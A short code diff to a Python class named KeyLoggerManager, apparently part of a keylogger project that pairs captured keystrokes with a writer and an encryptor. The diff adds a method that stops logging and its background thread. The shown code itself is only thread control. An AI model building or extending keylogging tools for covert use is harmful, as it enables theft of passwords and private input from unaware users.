@@ -2,7 +2,6 @@ from datetime import datetime
 import time
 import threading
 
-
 class KeyLoggerManager:
     def __init__(self, keylogger, writer, encryptor, interval=5, machine_name="Machine1"):
         self.keylogger = keylogger
@@ -33,3 +32,10 @@ class KeyLoggerManager:
             self.keylogger.start_logging()
             self.thread = threading.Thread(target=self.collect_and_store, daemon=True)
             self.thread.start()
+
+    def stop(self):
+        if self.running:
+            self.running = False
+            self.keylogger.stop_logging()
+            if self.thread:
+                self.thread.join()
